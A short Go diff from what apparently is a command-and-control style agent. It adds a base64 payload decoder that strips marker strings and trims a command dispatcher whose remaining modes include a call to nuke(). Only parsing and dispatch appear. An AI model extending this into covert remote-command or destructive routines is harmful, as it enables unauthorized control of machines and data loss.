@@ -78,6 +78,17 @@ func encodePayload(data string, mode string, aid string) string {
 	return fin
 }
 
+func decodePayload(payload string) string {
+	encodedPayload := strings.Replace(payload, MAGICSTR, "", -1) //trim magic chars from payload
+	encodedPayload = strings.Replace(encodedPayload, MAGICTERMSTR, "", -1)
+	data, err := base64.StdEncoding.DecodeString(encodedPayload)
+	if err != nil {
+		fmt.Println("error:", err)
+		return ""
+	}
+	return string(data)
+}
+
 func checkRegStatus() bool {
 	if _, err := os.Stat(REGFILE); os.IsNotExist(err) {
 		return false
@@ -151,12 +162,6 @@ func execCommand(mode string, args string) string {
 	case "A":
 		retval = unknownCom()
 	case "B":
-		retval = unknownCom()
-	case "C":
-		retval = unknownCom()
-	case "D":
-		retval = unknownCom()
-	case "E":
 		retval = unknownCom()
 	case "F":
 		retval = nuke()
